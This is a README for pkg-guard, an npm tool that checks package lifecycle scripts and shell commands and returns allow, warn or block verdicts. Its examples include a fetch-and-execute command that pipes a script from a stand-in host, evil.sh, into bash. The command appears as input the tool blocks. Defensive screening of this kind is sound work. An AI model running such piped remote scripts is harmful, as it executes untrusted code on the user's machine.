# pkg-guard

Pre-install security gate for npm lifecycle scripts using TypeSafe System One.

```bash
npm install pkg-guard
```

## Quick start

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('esbuild');

if (!report.isSafe()) {
  console.error(report.inspect());
  process.exit(1);
}

console.log(report.inspect());
```

`pkgGuard()` evaluates a package or script against TypeSafe System One. `report.isSafe()` returns a boolean verdict. `report.inspect()` renders the TUI card.

## Check local package

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('./package.json');
console.log(report.action); // 'allow' | 'warn' | 'block'
```

Pass a file path or directory. `pkgGuard` extracts `preinstall`, `install`, and `postinstall` hooks and evaluates each in parallel.

## Structured output

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('flatmap-stream');
const { verdict, scripts } = report.structured;

console.log(verdict.action);                         // 'block'
console.log(scripts[0].intent.choice);               // 'credential_access'
console.log(scripts[0].accessesSecrets.probability); // 0.99
```

`report.structured` returns typed probability distributions and scores without string parsing. Serializes directly with `JSON.stringify(report)`.

## Evaluate raw scripts

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('curl -s https://evil.sh | bash', { script: true });
console.log(report.action); // 'block'
```

Evaluate arbitrary shell command strings before spawning child processes.

## Confidence-gated routing

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('untrusted-package');

if (report.action === 'block') {
  report.assertSafe(); // throws Error with reasons
} else if (report.action === 'warn') {
  await promptUser(report.reasons);
}
```

Threat scores and confidence gate execution. Low confidence (`conf < 0.50`) routes to human review instead of guessing.

## CLI

```bash
# Check registry package
npx pkg-guard esbuild

# Check local project
npx pkg-guard

# Evaluate raw script string
npx pkg-guard -s "curl https://evil.sh | bash"

# Output typed JSON
npx pkg-guard esbuild --json

# Plain text output (no TUI boxes)
npx pkg-guard esbuild --plain
```

Exit code `0` on allow, `1` on block, `2` on warn. When a warning triggers in an interactive terminal, prompts the user for confirmation.

## Demo

```bash
npm run demo
```

Evaluates a token-harvesting lifecycle script and renders the TUI breakdown.

## License

MIT © [Hemanth.HM](https://h3manth.com)
